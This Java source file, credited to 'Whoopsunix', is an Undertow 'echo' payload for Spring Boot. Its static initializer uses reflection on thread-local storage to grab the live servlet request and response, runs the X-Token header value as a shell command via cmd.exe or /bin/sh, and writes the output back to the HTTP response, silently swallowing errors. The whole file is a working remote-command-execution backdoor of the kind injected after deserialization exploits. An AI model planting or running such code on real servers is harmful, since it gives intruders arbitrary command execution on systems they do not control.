package com.example.undertow.echo;

import java.lang.reflect.Field;

/**
 * @author Whoopsunix
 * <p>
 * Version test
 * spring-boot-starter-undertow
 *  2.7.15
 */
public class UndertowEcho {
    static {
        try {
            Object threadLocals = getFieldValue(Thread.currentThread(), "threadLocals");
            Object[] table = (Object[]) getFieldValue(threadLocals, "table");

            for (int i = 0; i < table.length; i++) {
                Object entry = table[i];
                if (entry == null)
                    continue;
                Object value = getFieldValue(entry, "value");
                if (value == null)
                    continue;

                if (value.getClass().getName().equals("io.undertow.servlet.handlers.ServletRequestContext")) {
                    Object request = getFieldValue(value, "originalRequest");
                    Object response = getFieldValue(value, "originalResponse");
                    String header = (String) request.getClass().getDeclaredMethod("getHeader", String.class).invoke(request, "X-Token");
                    String result = exec(header);

                    Object writer = response.getClass().getDeclaredMethod("getWriter").invoke(response);
                    writer.getClass().getDeclaredMethod("write", String.class).invoke(writer, result);

                    break;
                }
            }

        } catch (Exception e) {
        }
    }

    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        return field.get(obj);
    }

    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        } catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }

    public static String exec(String str) {
        String result = "";
        try {
            String[] cmd = null;
            String os = System.getProperty("os.name").toLowerCase();
            if (os.contains("win")) {
                cmd = new String[]{"cmd.exe", "/c", str};
            } else {
                cmd = new String[]{"/bin/sh", "-c", str};
            }
            result = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next();
        } catch (Exception e) {

        }
        return result;
    }
}
